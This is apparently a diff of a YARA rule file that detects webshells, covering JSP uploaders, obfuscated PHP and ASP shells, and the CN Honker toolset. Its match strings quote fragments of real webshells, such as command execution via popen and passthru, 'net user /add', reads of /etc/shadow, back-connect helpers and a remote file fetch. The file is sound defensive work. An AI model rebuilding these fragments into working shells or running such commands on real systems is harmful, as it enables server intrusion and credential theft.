-        $jstring21 = /\\uuu{0,50}00/ wide ascii //obfuscated via javas unlimited amount of u in \uuuuuu
-        $jstring22 = /[\w\.]\\u(FFFB|FEFF|FFF9|FFFA|200C|202E|202D)[\w\.]/ wide ascii // java ignores the unicode Interlinear Annotation Terminator inbetween any command
-        $jstring23 = "\"e45e329feb5d925b\"" wide ascii
-        $jstring24 = "u<![CDATA[n" wide ascii
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_bin_files
-        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
-        $pack  = { 50 41 43 4b 00 00 00 02 00 }
-
-    condition:
-        //any of them or
-        not (
-            uint16(0) == 0x5a4d or
-            $dex at 0 or
-            $pack at 0 or
-            // fp on jar with zero compression
-            uint16(0) == 0x4b50
-        ) and
-        (
-            (
-                filesize < 100KB and
-                (
-                    $cjsp_short1 at 0 or
-                    any of ( $cjsp_long* ) or
-                    ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-                    (
-                        $cjsp_short2 and (
-                            $cjsp_short1 in ( 0..1000 ) or
-                            $cjsp_short1 in ( filesize-1000..filesize )
-                        )
-                    )
-                )
-                and any of ( $jstring* )
-            ) or (
-                filesize < 500KB and
-                (
-                    #jstring21 > 20 or
-                    $jstring18 or
-                    $jstring19 or
-                    $jstring20
-
-                )
-            )
-        )
-}
-
-rule WEBSHELL_JSP_Input_Upload_Write
-{
-    meta:
-        description = "JSP uploader which gets input, writes files and contains \"upload\""
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/24"
-        modified = "2024-12-09"
-        hash = "ef98ca135dfb9dcdd2f730b18e883adf50c4ab82"
-        hash = "583231786bc1d0ecca7d8d2b083804736a3f0a32"
-        hash = "19eca79163259d80375ebebbc440b9545163e6a3"
-
-        id = "bbf26edd-88b7-5ec5-a16e-d96a086dcd19"
-    strings:
-        $upload = "upload" nocase wide ascii
-        $write1 = "os.write" fullword wide ascii
-        $write2 = "FileOutputStream" fullword wide ascii
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_jsp_input
-        // request.getParameter
-        $input1 = "getParameter" fullword ascii wide
-        // request.getHeaders
-        $input2 = "getHeaders" fullword ascii wide
-        $input3 = "getInputStream" fullword ascii wide
-        $input4 = "getReader" fullword ascii wide
-        $req1 = "request" fullword ascii wide
-        $req2 = "HttpServletRequest" fullword ascii wide
-        $req3 = "getRequest" fullword ascii wide
-
-    condition:
-        filesize < 10KB and (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        and (
-            any of ( $input* ) and
-            any of ( $req* )
-        )
-        and $upload and 1 of ( $write* )
-}
-
-rule WEBSHELL_Generic_OS_Strings : FILE {
-    meta:
-        description = "typical webshell strings"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        date = "2021/01/12"
-        modified = "2024-12-09"
-        score = 50
-        hash = "d5bfe40283a28917fcda0cefd2af301f9a7ecdad"
-        hash = "fd45a72bda0a38d5ad81371d68d206035cb71a14"
-        hash = "b4544b119f919d8cbf40ca2c4a7ab5c1a4da73a3"
-        hash = "569259aafe06ba3cef9e775ee6d142fed6edff5f"
-        hash = "48909d9f4332840b4e04b86f9723d7427e33ac67"
-        hash = "0353ae68b12b8f6b74794d3273967b530d0d526f"
-        id = "ea85e415-4774-58ac-b063-0f5eb535ec49"
-    strings:
-        $fp1 = "http://evil.com/" wide ascii
-        $fp2 = "denormalize('/etc/shadow" wide ascii
-      $fp3 = "vim.org>"
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-        //strings from private rule capa_php_old_safe
-        $php_short = "<?" wide ascii
-        // prevent xml and asp from hitting with the short tag
-        $no_xml1 = "<?xml version" nocase wide ascii
-        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
-        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
-        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
-        $no_pdf = "<?xpacket"
-
-        // of course the new tags should also match
-        // already matched by "<?"
-        $php_new1 = /<\?=[^?]/ wide ascii
-        $php_new2 = "<?php" nocase wide ascii
-        $php_new3 = "<script language=\"php" nocase wide ascii
-
-        //strings from private rule capa_jsp_safe
-        $cjsp_short1 = "<%" ascii wide
-        $cjsp_short2 = "%>" wide ascii
-        $cjsp_long1 = "<jsp:" ascii wide
-        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
-        // JSF
-        $cjsp_long3 = "/jstl/core" ascii wide
-        $cjsp_long4 = "<%@p" nocase ascii wide
-        $cjsp_long5 = "<%@ " nocase ascii wide
-        $cjsp_long6 = "<% " ascii wide
-        $cjsp_long7 = "< %" ascii wide
-
-        //strings from private rule capa_os_strings
-        // windows = nocase
-        $w1 = "net localgroup administrators" nocase wide ascii
-        $w2 = "net user" nocase wide ascii
-        $w3 = "/add" nocase wide ascii
-        // linux stuff, case sensitive:
-        $l1 = "/etc/shadow" wide ascii
-        $l2 = "/etc/ssh/sshd_config" wide ascii
-        $take_two1 = "net user" nocase wide ascii
-        $take_two2 = "/add" nocase wide ascii
-
-    condition:
-        filesize < 70KB and
-        ( (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        or (
-            (
-                (
-                        $php_short in (0..100) or
-                        $php_short in (filesize-1000..filesize)
-                )
-                and not any of ( $no_* )
-            )
-            or any of ( $php_new* )
-        )
-        or (
-        $cjsp_short1 at 0 or
-            any of ( $cjsp_long* ) or
-            ($cjsp_short1 and $cjsp_short2 in ( filesize-100..filesize )) or
-        (
-            $cjsp_short2 and (
-                $cjsp_short1 in ( 0..1000 ) or
-                $cjsp_short1 in ( filesize-1000..filesize )
-            )
-        )
-        )
-        ) and (
-            filesize < 300KB and
-        not uint16(0) == 0x5a4d and (
-            all of ( $w* ) or
-            all of ( $l* ) or
-            2 of ( $take_two* )
-        )
-        )
-        and not any of ( $fp* )
-}
-
-rule WEBSHELL_Mixed_OBFUSC {
-   meta:
-      description = "Detects webshell with mixed obfuscation commands"
-      author = "Arnim Rupp (https://github.com/ruppde)"
-      reference = "Internal Research"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      date = "2023-01-28"
-      modified = "2023-04-05"
-      hash1 = "8c4e5c6bdfcc86fa27bdfb075a7c9a769423ec6d53b73c80cbc71a6f8dd5aace"
-      hash2 = "78f2086b6308315f5f0795aeaa75544128f14889a794205f5fc97d7ca639335b"
-      hash3 = "3bca764d44074820618e1c831449168f220121698a7c82e9909f8eab2e297cbd"
-      hash4 = "b26b5e5cba45482f486ff7c75b54c90b7d1957fd8e272ddb4b2488ec65a2936e"
-      hash5 = "e217be2c533bfddbbdb6dc6a628e0d8756a217c3ddc083894e07fd3a7408756c"
-      score = 50
-      id = "dcb4054b-0c87-5cd0-9297-7fd5f2e37437"
-   strings:
-      $s1 = "rawurldecode/*" ascii
-      $s2 = "preg_replace/*" ascii
-      $s3 = " __FILE__/*" ascii
-      $s4 = "strlen/*" ascii
-      $s5 = "str_repeat/*" ascii
-      $s6 = "basename/*" ascii
-   condition:
-      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 4 of them ))
-}
-
-rule WEBSHELL_Cookie_Post_Obfuscation {
-    meta:
-        description = "Detects webshell using cookie POST"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2023-01-28"
-        modified = "2023-04-05"
-        license = "https://github.com/SigmaHQ/Detection-Rule-License/blob/main/LICENSE.Detection.Rules.md"
-        hash = "d08a00e56feb78b7f6599bad6b9b1d8626ce9a6ea1dfdc038358f4c74e6f65c9"
-        hash = "2ce5c4d31682a5a59b665905a6f698c280451117e4aa3aee11523472688edb31"
-        hash = "ff732d91a93dfd1612aed24bbb4d13edb0ab224d874f622943aaeeed4356c662"
-        hash = "a3b64e9e065602d2863fcab641c75f5d8ec67c8632db0f78ca33ded0f4cea257"
-        hash = "d41abce305b0dc9bd3a9feb0b6b35e8e39db9e75efb055d0b1205a9f0c89128e"
-        hash = "333560bdc876fb0186fae97a58c27dd68123be875d510f46098fc5a61615f124"
-        hash = "2efdb79cdde9396ff3dd567db8876607577718db692adf641f595626ef64d3a4"
-        hash = "e1bd3be0cf525a0d61bf8c18e3ffaf3330c1c27c861aede486fd0f1b6930f69a"
-        hash = "f8cdedd21b2cc29497896ec5b6e5863cd67cc1a798d929fd32cdbb654a69168a"
-
-        id = "cc5ded80-5e58-5b25-86d1-1c492042c740"
-    strings:
-        $s1 = "]($_COOKIE, $_POST) as $"
-        $s2 = "function"
-        $s3 = "Array"
-    condition:
-    ( uint16(0) == 0x3f3c and filesize < 100KB and ( all of them ))
-}
-
-rule IronGate_PyInstaller_update_EXE {
-   meta:
-      description = "Detects a PyInstaller file named update.exe as mentioned in the IronGate APT"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://goo.gl/Mr6M2J"
-      date = "2016-06-04"
-      modified = "2023-01-06"
-      score = 60
-      hash1 = "2044712ceb99972d025716f0f16aa039550e22a63000d2885f7b7cd50f6834e0"
-      id = "f8d1b97e-86d9-547f-a212-a84fb068af3c"
-   strings:
-      $s1 = "bpython27.dll" fullword ascii
-      $s5 = "%s%s.exe" fullword ascii
-      $s6 = "bupdate.exe.manifest" fullword ascii
-      $s9 = "bunicodedata.pyd" fullword ascii
-      $s11 = "distutils.sysconfig(" ascii
-      $s16 = "distutils.debug(" ascii
-      $s18 = "supdate" fullword ascii
-   condition:
-      uint16(0) == 0x5a4d and all of them
 }
 
 rule WiltedTulip_WindowsTask {
@@ -18620,6 +18756,23 @@ rule CN_Honker_Webshell_Serv_U_2_admin_by_lake2 {
 		filesize < 17KB and 2 of them
 }
 
+rule CN_Honker_Webshell_PHP_php3 {
+	meta:
+		description = "Webshell from CN Honker Pentest Toolset - file php3.txt"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "Disclosed CN Honker Pentest Toolset"
+		date = "2015-06-23"
+		score = 70
+		hash = "e2924cb0537f4cdfd6f1bd44caaaf68a73419b9d"
+		id = "3000ac40-35de-5d24-85fb-4d105b07c2e7"
+	strings:
+		$s1 = "} elseif(@is_resource($f = @popen($cfe,\"r\"))) {" fullword ascii /* PEStudio Blacklist: strings */
+		$s2 = "cf('/tmp/.bc',$back_connect);" fullword ascii /* PEStudio Blacklist: strings */
+	condition:
+		filesize < 8KB and all of them
+}
+
 rule CN_Honker_Webshell_Serv_U_by_Goldsun {
 	meta:
 		description = "Webshell from CN Honker Pentest Toolset - file Serv-U_by_Goldsun.asp"
@@ -18693,24 +18846,6 @@ rule CN_Honker_Webshell_ASP_hy2006a {
 		filesize < 406KB and all of them
 }
 
-rule CN_Honker_Webshell_PHP_php1 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file php1.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "c2f4b150f53c78777928921b3a985ec678bfae32"
-		id = "5fe78cc6-8be3-595f-a082-e361259938e5"
-	strings:
-		$s7 = "$sendbuf = \"site exec \".$_POST[\"SUCommand\"].\"\\r\\n\";" fullword ascii /* PEStudio Blacklist: strings */
-		$s8 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c" ascii /* PEStudio Blacklist: strings */
-		$s18 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport" ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 621KB and all of them
-}
-
 rule CN_Honker_Webshell_jspshell2 {
 	meta:
 		description = "Webshell from CN Honker Pentest Toolset - file jspshell2.txt"
@@ -18793,23 +18928,6 @@ rule CN_Honker_Webshell_ASPX_aspx3 {
 		filesize < 100KB and all of them
 }
 
-rule CN_Honker_Webshell_ASPX_shell_shell {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file shell.aspx"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "1816006827d16ed73cefdd2f11bd4c47c8af43e4"
-		id = "8fbcae22-07b7-5afe-9f15-06e2f426b5ca"
-	strings:
-		$s0 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook" ascii /* PEStudio Blacklist: strings */
-		$s1 = "<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 1KB and all of them
-}
-
 rule CN_Honker_Webshell__php1_php7_php9 {
 	meta:
 		description = "Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt"
@@ -18961,566 +19079,6 @@ rule CN_Honker_Webshell_ASP_asp2 {
 	condition:
 		filesize < 10KB and all of them
 }
-
-rule CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "fe63b215473584564ef2e08651c77f764999e8ac"
-		id = "dd619901-6f0e-527e-9926-808176641c09"
-	strings:
-		$s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
-		$s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii /* PEStudio Blacklist: strings */
-		$s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii /* PEStudio Blacklist: strings */
-		$s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 20KB and 3 of them
-}
-
-rule CN_Honker_Webshell_ASP_shell {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file shell.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "b7b34215c2293ace70fc06cbb9ce73743e867289"
-		id = "fdfc3fc1-9400-533b-978b-1a1fac112e1f"
-	strings:
-		$s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
-	condition:
-		filesize < 1KB and all of them
-}
-
-rule CN_Honker_Webshell_PHP_php7 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file php7.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
-		id = "f21bb0db-d18a-58c0-a227-5baf5536c57b"
-	strings:
-		$s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }" ascii /* PEStudio Blacklist: strings */
-		$s1 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss" ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 300KB and all of them
-}
-
-rule CN_Honker_Webshell_jspshell2 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file jspshell2.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "cc7bc1460416663012fc93d52e2078c0a277ff79"
-		id = "ff72f94b-1c0a-5615-b35f-35f69c920292"
-	strings:
-		$s10 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii /* PEStudio Blacklist: strings */
-		$s11 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt" ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 424KB and all of them
-}
-
-rule CN_Honker_Webshell_Tuoku_script_mysql {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file mysql.aspx"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "8e242c40aabba48687cfb135b51848af4f2d389d"
-		id = "fa0627fb-a40c-5856-ae78-17d33910878f"
-	strings:
-		$s1 = "txtpassword.Attributes.Add(\"onkeydown\", \"SubmitKeyClick('btnLogin');\");" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "connString = string.Format(\"Host = {0}; UserName = {1}; Password = {2}; Databas" ascii /* PEStudio Blacklist: strings */condition:
-		filesize < 202KB and all of them
-}
-
-rule CN_Honker_Webshell_PHP_php9 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file php9.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "cd3962b1dba9f1b389212e38857568b69ca76725"
-		id = "c8cbee10-78ea-5a6f-9c80-7e51a9c38440"
-	strings:
-		$s1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r ab" ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 1087KB and all of them
-}
-
-rule CN_Honker_Webshell_portRecall_jsp {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file jsp.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "65e8e4d13ad257c820cad12eef853c6d0134fce8"
-		id = "cd34cb47-c5e0-5094-a501-6a8a00d94018"
-	strings:
-		$s0 = "lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2" ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 1KB and all of them
-}
-
-rule CN_Honker_Webshell_ASPX_aspx3 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file aspx3.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "dd61481771f67d9593214e605e63b62d5400c72f"
-		id = "4f835136-744a-5324-a1f4-02d1cfa2cab6"
-	strings:
-		$s0 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m" ascii /* PEStudio Blacklist: strings */
-		$s12 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS:" ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 100KB and all of them
-}
-
-rule CN_Honker_Webshell_ASPX_shell_shell {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file shell.aspx"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "1816006827d16ed73cefdd2f11bd4c47c8af43e4"
-		id = "8fbcae22-07b7-5afe-9f15-06e2f426b5ca"
-	strings:
-		$s0 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook" ascii /* PEStudio Blacklist: strings */
-		$s1 = "<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 1KB and all of them
-}
-
-rule CN_Honker_Webshell__php1_php7_php9 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		super_rule = 1
-		hash0 = "c2f4b150f53c78777928921b3a985ec678bfae32"
-		hash1 = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
-		hash2 = "cd3962b1dba9f1b389212e38857568b69ca76725"
-		id = "cfc2f624-976f-5ff6-bd07-10948b9290bc"
-	strings:
-		$s1 = "<a href=\"?s=h&o=wscript\">[WScript.shell]</a> " fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "document.getElementById('cmd').value = Str[i];" fullword ascii
-		$s3 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii
-	condition:
-		filesize < 300KB and all of them
-}
-
-rule CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		super_rule = 1
-		hash0 = "d4d7a632af65a961a1dbd0cff80d5a5c2b397e8c"
-		hash1 = "87c5a76989bf08da5562e0b75c196dcb3087a27b"
-		hash2 = "cee91cd462a459d31a95ac08fe80c70d2f9c1611"
-		id = "e91e05e8-0f6d-57a7-a649-a834733f17c8"
-	strings:
-		$s1 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCr" ascii
-	condition:
-		filesize < 444KB and all of them
-}
-
-rule CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL_ {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		super_rule = 1
-		hash0 = "4005b83ced1c032dc657283341617c410bc007b8"
-		hash1 = "4005b83ced1c032dc657283341617c410bc007b8"
-		hash2 = "7097c21f92306983add3b5b29a517204cd6cd819"
-		hash3 = "7097c21f92306983add3b5b29a517204cd6cd819"
-		id = "e0070f0d-35d0-5024-88e7-e0e04b29f485"
-	strings:
-		$s0 = "\"<form name=\"\"searchfileform\"\" action=\"\"?action=searchfile\"\" method=\"" ascii /* PEStudio Blacklist: strings */
-		$s1 = "\"<TD ALIGN=\"\"Left\"\" colspan=\"\"5\"\">[\"& DbName & \"]" fullword ascii
-		$s2 = "Set Conn = Nothing " fullword ascii
-	condition:
-		filesize < 341KB and all of them
-}
-
-rule CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		super_rule = 1
-		hash0 = "3484ed16e6f9e0d603cbc5cb44e46b8b7e775d35"
-		hash1 = "5e1851c77ce922e682333a3cb83b8506e1d7395d"
-		hash2 = "f80ec26bbdc803786925e8e0450ad7146b2478ff"
-		hash3 = "e83d427f44783088a84e9c231c6816c214434526"
-		id = "e154ecb5-9d56-520a-b76a-635a8864f0a8"
-	strings:
-		$s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "strReturn=Replace(strReturn,chr(43),\"%2B\")  'JMDCW" fullword ascii
-	condition:
-		filesize < 7342KB and all of them
-}
-
-rule CN_Honker_Webshell_cmfshell {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file cmfshell.cmf"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
